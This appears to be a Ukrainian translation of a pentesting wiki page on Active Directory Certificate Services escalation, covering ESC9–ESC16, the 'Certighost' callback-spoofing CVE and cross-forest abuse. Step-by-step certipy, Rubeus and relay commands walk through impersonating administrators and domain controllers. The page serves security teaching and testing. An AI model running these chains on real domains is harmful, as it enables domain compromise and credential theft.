Припустімо, що `John@corp.local` має дозволи `GenericWrite` щодо `Jane@corp.local` і прагне скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, у якому `Jane@corp.local` має право виконувати enrollment, налаштовано з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у його параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials завдяки `GenericWrite`, який має `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Згодом `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно опускаючи доменну частину `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця зміна не порушує обмежень, оскільки `Administrator@corp.local` залишається окремим `userPrincipalName` для `Administrator`.

Після цього вразливий шаблон сертифіката `ESC9` запитується від імені `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зазначено, що `userPrincipalName` сертифіката відповідає `Administrator`, без будь-якого “object SID”.

Потім `userPrincipalName` `Jane` повертається до початкового значення `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT-хеш `Administrator@corp.local`. Команда має містити `-domain <domain>` через відсутність у сертифікаті визначення домену:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Слабкі Certificate Mappings - ESC10

### Пояснення

На контролері домену ESC10 стосується двох значень ключів реєстру:

- Значення за замовчуванням для `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` — `0x18` (`0x8 | 0x10`), раніше — `0x1F`.
- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` — `1`, раніше — `0`.<sup>[[7]](#references)</sup>

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` містить біт `UPN` (`0x4`).

### Сценарій зловживання 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A із дозволами `GenericWrite` можна використати для компрометації будь-якого облікового запису B.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, атакер прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9, що дозволяє використовувати будь-який certificate template.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Згодом `userPrincipalName` облікового запису `Jane` змінюється на `Administrator`, навмисно без частини `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього від імені `Jane` запитується сертифікат, що дає змогу автентифікації клієнта, з використанням стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` потім повертається до початкового значення `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Аутентифікація за допомогою отриманого сертифіката поверне NT-хеш `Administrator@corp.local`, тому в команді необхідно вказати домен через відсутність відомостей про домен у сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Сценарій зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого відсутня властивість `userPrincipalName`, зокрема облікові записи комп'ютерів і вбудований адміністратор домену `Administrator`.

У цьому випадку мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials із використанням `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` облікового запису `Jane` потім встановлюється як `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується як `Jane` за допомогою шаблону `User` за замовчуванням.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` повертається до початкового значення після цього процесу.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для автентифікації через Schannel використовується опція `-ldap-shell` у Certipy, що вказує на успішну автентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell такі команди, як `set_rbcd`, уможливлюють атаки Resource-Based Constrained Delegation (RBCD), що потенційно дає змогу скомпрометувати контролер домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, якому бракує `userPrincipalName` або значення якого не збігається із `sAMAccountName`. Обліковий запис `Administrator@corp.local` є основною ціллю через його підвищені привілеї LDAP і відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не налаштований із `IF_ENFORCEENCRYPTICERTREQUEST`, атаки NTLM relay можна виконувати без підпису через службу RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Ви можете використати `certipy`, щоб перевірити, чи вимкнено `Enforce Encryption for Requests`; у такому разі certipy покаже вразливість `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або використовуючи [fork impacket від sploutchy](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority для зберігання ключа на зовнішньому пристрої, наприклад "Yubico YubiHSM2".

Якщо USB-пристрій підключено до CA-сервера через USB-порт або через USB device server, якщо CA-сервер є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають "паролем"), щоб генерувати та використовувати ключі в YubiHSM.

Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Сценарій експлуатації

Якщо приватний ключ CA зберігається на фізичному USB-пристрої та ви отримали shell access, ключ можна відновити.

Спочатку потрібно отримати сертифікат CA (він є публічним), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте команду certutil `-sign`, щоб підробити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дає змогу додати політику видачі до шаблону сертифіката. Об’єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна знайти в Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов’язати з групою AD за допомогою атрибута `msDS-OIDToGroupLink` цього об’єкта, що дає змогу системі авторизувати користувача, який пред’являє сертифікат, так, ніби він є членом цієї групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Іншими словами, якщо користувач має дозвіл на реєстрацію сертифіката, а сертифікат пов’язаний із групою OID, користувач може успадкувати привілеї цієї групи.

Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозвіл користувача за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію в `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Потрібно лише вказати шаблон, після чого буде отримано сертифікат із правами `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Небезпечна конфігурація поновлення сертифіката - ESC14

### Пояснення

Опис за адресою https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно ґрунтовний. Нижче наведено цитату з оригінального тексту.<sup>[[14]](#references)</sup>

ESC14 стосується вразливостей, що виникають через "weak explicit certificate mapping", переважно внаслідок неправильного використання або небезпечної конфігурації атрибута `altSecurityIdentities` облікових записів користувачів або комп'ютерів Active Directory. Цей багатозначний атрибут дає змогу адміністраторам вручну пов'язувати X.509-сертифікати з обліковим записом AD для автентифікації. Якщо ці явні зіставлення налаштовано, вони можуть перевизначати стандартну логіку зіставлення сертифікатів, яка зазвичай використовує UPN або DNS-імена в SAN сертифіката чи SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

"Слабке" зіставлення виникає, коли рядкове значення, що використовується в атрибуті `altSecurityIdentities` для ідентифікації сертифіката, є надто широким, легко вгадуваним, ґрунтується на неунікальних полях сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо attacker може отримати або створити сертифікат, атрибути якого відповідають такому слабко визначеному явному зіставленню привілейованого облікового запису, він може використати цей сертифікат для автентифікації від імені цього облікового запису та його impersonation.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за загальним Subject Common Name (CN): наприклад, `X509:<S>CN=SomeUser`. Attacker може отримати сертифікат із таким CN з менш захищеного джерела.
- Використання надто загальних Issuer Distinguished Names (DN) або Subject DN без додаткової кваліфікації, наприклад конкретного серійного номера або subject key identifier: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або не криптографічних ідентифікаторів, яким attacker може відповідати у сертифікаті, який він може легітимно отримати або підробити (якщо він скомпрометував CA або знайшов вразливий template, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними Issuer і Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, неявно обмеженим Issuer DN) - це не стандартний формат, зазвичай використовується `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за SHA1-хешем необробленого відкритого ключа сертифіката - загалом надійний варіант)

Безпека цих зіставлень значною мірою залежить від конкретності, унікальності та криптографічної стійкості вибраних ідентифікаторів сертифіката, які використовуються в рядку зіставлення. Навіть за ввімкнених на Domain Controllers режимів strong certificate binding (які переважно впливають на неявні зіставлення на основі SAN UPN/DNS і розширення SID) неправильно налаштований запис `altSecurityIdentities` усе ще може створювати прямий шлях до impersonation, якщо сама логіка зіставлення є помилковою або надто permissive.
### Сценарій зловживання

ESC14 спрямований на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або через неправильну конфігурацію), attackers можуть impersonate облікові записи, надаючи сертифікати, що відповідають зіставленню.

#### Сценарій A: Attacker може записувати до `altSecurityIdentities`

**Передумова**: Attacker має дозволи на запис до атрибута `altSecurityIdentities` цільового облікового запису або дозвіл надати собі такий доступ у формі одного з наведених дозволів на цільовому об'єкті AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Сценарій B: Ціль має слабке зіставлення через X509RFC822 (Email)

- **Передумова**: Ціль має слабке зіставлення X509RFC822 в altSecurityIdentities. Attacker може задати атрибут mail жертви так, щоб він відповідав імені X509RFC822 цілі, зареєструвати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій C: Ціль має зіставлення X509IssuerSubject

- **Передумова**: Ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`.Attacker може задати атрибут `cn` або `dNSHostName` principal жертви так, щоб він відповідав subject зіставлення X509IssuerSubject цілі. Потім attacker може зареєструвати сертифікат від імені жертви та використати цей сертифікат для автентифікації як ціль.

#### Сценарій D: Ціль має зіставлення X509SubjectOnly

- **Передумова**: Ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Attacker може задати атрибут `cn` або `dNSHostName` principal жертви так, щоб він відповідав subject зіставлення X509SubjectOnly цілі. Потім attacker може зареєструвати сертифікат від імені жертви та використати цей сертифікат для автентифікації як ціль.
### конкретні операції
#### Сценарій A

Запросіть сертифікат за template сертифіката `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Збережіть і конвертуйте сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Автентифікуватися (використовуючи сертифікат)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов’язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш специфічних методів атак у різних сценаріях атак зверніться до: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## Політики застосунків EKUwu(CVE-2024-49019) - ESC15

### Пояснення

Опис за адресою https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc є надзвичайно детальним. Нижче наведено цитату з оригінального тексту.<sup>[[15]](#references)</sup>

Використовуючи вбудовані стандартні шаблони сертифікатів версії 1, зловмисник може створити CSR із включеними політиками застосунків, яким надається перевага над налаштованими атрибутами Extended Key Usage, вказаними в шаблоні. Єдиною вимогою є наявність прав на enrollment, після чого можна створювати сертифікати для автентифікації клієнта, агента запитів сертифікатів і підписування коду за допомогою шаблону **_WebServer_**

### Зловживання

Нижче наведено посилання на [цей матеріал]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),натисніть, щоб переглянути докладніші методи використання.<sup>[[14]](#references)</sup>


Команда `find` у Certipy допоможе виявити шаблони V1, потенційно вразливі до ESC15, якщо CA не оновлено.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Пряма імперсонація через Schannel

**Крок 1: Запит сертифіката з інжектуванням політики застосунку "Client Authentication" і цільового UPN.** Атакер `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє суб’єкту, наданому enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Вразливий шаблон V1 із параметром "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для impersonation.

**Крок 2: Автентифікуватися через Schannel (LDAPS), використовуючи отриманий сертифікат.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation через зловживання Enrollment Agent

**Крок 1: Запросіть сертифікат із шаблону V1 (із параметром "Enrollee supplies subject"), додавши Application Policy "Certificate Request Agent".** Цей сертифікат призначений для attacker (`attacker@corp.local`), щоб стати enrollment agent. Тут для власної ідентифікації attacker не вказується UPN, оскільки метою є отримання можливості агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: додає OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат «agent», щоб запитати сертифікат від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, у якому сертифікат із кроку 1 використовується як сертифікат агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Автентифікуйтеся як привілейований користувач, використовуючи сертифікат "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Розширення безпеки вимкнено на CA (глобально)-ESC16

### Пояснення

**ESC16 (підвищення привілеїв через відсутнє розширення szOID_NTDS_CA_SECURITY_EXT)** означає сценарій, за якого, якщо конфігурація AD CS не вимагає включення розширення **szOID_NTDS_CA_SECURITY_EXT** в усі сертифікати, attacker може скористатися цим, щоб:

1. Запросити сертифікат **без SID binding**.

2. Використати цей сертифікат **для authentication від імені будь-якого облікового запису**, наприклад impersonating обліковий запис із високими привілеями (наприклад, Domain Administrator).

Ви також можете ознайомитися з цією статтею, щоб дізнатися більше про детальний принцип:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Зловживання

Наведене нижче посилається на [це посилання](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), натисніть, щоб переглянути докладніші способи використання.<sup>[[14]](#references)</sup>

Щоб визначити, чи є середовище Active Directory Certificate Services (AD CS) вразливим до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитати початковий UPN облікового запису жертви (необов’язково — для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN облікового запису жертви до `sAMAccountName` цільового адміністратора.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (за потреби) Отримайте облікові дані облікового запису «жертви» (наприклад, за допомогою Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат як користувач "victim" із _будь-якого придатного шаблону автентифікації клієнта_ (наприклад, "User") на вразливому до ESC16 CA.** Оскільки CA вразливий до ESC16, він автоматично не включить розширення безпеки SID до виданого сертифіката, незалежно від конкретних налаштувань шаблону для цього розширення. Установіть змінну середовища для кешу облікових даних Kerberos (команда shell):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запитайте сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Відновіть UPN облікового запису "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Автентифікація як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Підміна ідентифікатора callback у Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** зловживає **AD CS enrollment chase / callback path**, у якому CA довіряє атрибутам запиту, наданим requester, для визначення ідентичності, яку слід помістити у виданий сертифікат. У публічному PoC сформований запит містить:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP під контролем attacker, до якого CA підключиться
- **`rmd`**: **DNS-ім’я цільового Domain Controller**, який потрібно impersonate

Якщо CA виконує цей chase, він підключиться до attacker через **SMB/LSA (`445`)** і **LDAP (`389`)**. Attacker використовує **реальний machine account** (зазвичай створений завдяки стандартному **`ms-DS-MachineAccountQuota`**), щоб callback session автентифікувалася як дійсний domain principal, але rogue services повертають атрибути ідентичності саме **цільового DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не пов’язує повернуту ідентичність з автентифікованим callback principal**, він може видати сертифікат для **Domain Controller**, хоча session була автентифікована як machine account під контролем attacker. Концептуально це відрізняє вразливість від **Certifried**: замість переписування атрибутів AD, таких як `dNSHostName`, attacker **підміняє дані ідентичності під час callback resolution CA**.<sup>[[2]](#references)</sup>

**Необхідні умови:**

- Облікові дані **domain** з низькими привілеями
- Можливість **створити або повторно використати computer account**
- Мережева доступність з **CA** до контрольованих attacker **портів `389` і `445`**
- Вразливий / не виправлений request path CA (оновлення Microsoft від **14 липня 2026 року** додало **DC validation для `cdc`** і **порівняння resolved-SID**)

Отриманий **`.pfx`** можна використати для **PKINIT**, створивши **`.ccache`** і, згідно з опублікованим PoC flow, **NT hash цільового DC**, чого зазвичай достатньо для **повної компрометації домену**.

### Експлуатація

Публічний PoC автоматизує весь ланцюжок:<sup>[[1]](#references)</sup>

1. Створити або повторно використати контрольований attacker **machine account**.
2. Запустити **rogue LDAP і SMB/LSA listeners** на `389` і `445`.
3. Надіслати certificate request, що містить контрольовані attacker атрибути **`cdc`** і цільовий **`rmd`**.
4. Дозволити CA автентифікуватися на rogue listeners як контрольований machine account, але відповідати на identity lookups атрибутами **цільового DC**.
5. Отримати підписаний CA **сертифікат DC**, а потім використати його для **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Корисні runtime-прапорці з PoC:

- `--listener <ip>`: явний вибір IP-адреси callback, яка рекламується в `cdc`
- `--computer-name <NAME$>`: повторне використання наявного облікового запису комп’ютера замість створення нового

**Операційні примітки:**

- Для PoC потрібні права **root**, оскільки він прив’язується до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально записуються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат зіставляється з обліковим записом **Domain Controller**, подальші дії можуть включати **certificate-based Kerberos auth**, **DCSync** і повторне використання отриманого **machine NT hash**.<sup>[[2]](#references)</sup>

## Пояснення компрометації лісів за допомогою сертифікатів у пасивному стані

### Порушення довірчих відносин між лісами через скомпрометовані CA

Конфігурація для **cross-forest enrollment** налаштовується відносно просто. **Сертифікат кореневого CA** з resource forest **публікується адміністраторами в account forests**, а сертифікати **enterprise CA** з resource forest **додаються до контейнерів `NTAuthCertificates` і AIA у кожному account forest**. Для уточнення: така схема надає **CA у resource forest повний контроль** над усіма іншими лісами, для яких він керує PKI. Якщо цей CA буде **скомпрометований attackers**, сертифікати для всіх користувачів у resource forest і account forests можуть бути **підроблені ними**, що порушує межу безпеки лісу.<sup>[[6]](#references)</sup>

### Надання прав на enrollment зовнішнім principals

У середовищах із кількома лісами необхідно бути обережними з Enterprise CA, які **публікують certificate templates**, що надають **Authenticated Users або foreign principals** (користувачам/групам за межами лісу, якому належить Enterprise CA) **права на enrollment і редагування**.\
Після автентифікації через trust **SID Authenticated Users** додається AD до токена користувача. Отже, якщо домен має Enterprise CA із template, який **надає Authenticated Users права на enrollment**, користувач з іншого лісу потенційно може **виконати enrollment у template**. Так само, якщо **права на enrollment явно надаються template foreign principal**, таким чином **створюється cross-forest access-control relationship**, що дає principal з одного лісу змогу **виконати enrollment у template з іншого лісу**.

Обидва сценарії призводять до **збільшення attack surface** з одного лісу в інший. Налаштування certificate template можуть бути використані attacker для отримання додаткових привілеїв у foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
